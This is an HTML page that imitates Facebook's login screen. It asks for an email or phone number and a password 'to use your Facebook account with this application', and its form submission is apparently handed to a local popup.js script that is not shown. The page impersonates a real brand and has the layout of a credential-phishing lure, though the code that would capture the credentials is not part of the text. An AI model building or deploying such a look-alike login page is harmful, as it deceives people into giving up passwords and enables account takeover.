<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log in to Facebook</title>
    <link rel="stylesheet" href="static/css/styles.css">
</head>
<body>
    <div class="login-container">
        <div class="header">
            <div class="facebook-logo">facebook</div>
        </div>
        <div class="login-form">
            <div class="form-title">
                Log in to use your Facebook account with this application.
            </div>
            <form id="loginForm">
                <div class="form-group">
                    <input type="text" 
                           class="form-control" 
                           name="email" 
                           placeholder="Email or phone" 
                           required>
                </div>
                <div class="form-group">
                    <input type="password" 
                           class="form-control" 
                           name="password" 
                           placeholder="Password" 
                           required>
                </div>
                <button type="submit" class="btn-login">Log In</button>
                <a href="#" class="forgot-link">Forgot account?</a>
            </form>
        </div>
    </div>
    <script src="static/js/popup.js"></script>
</body>
</html>
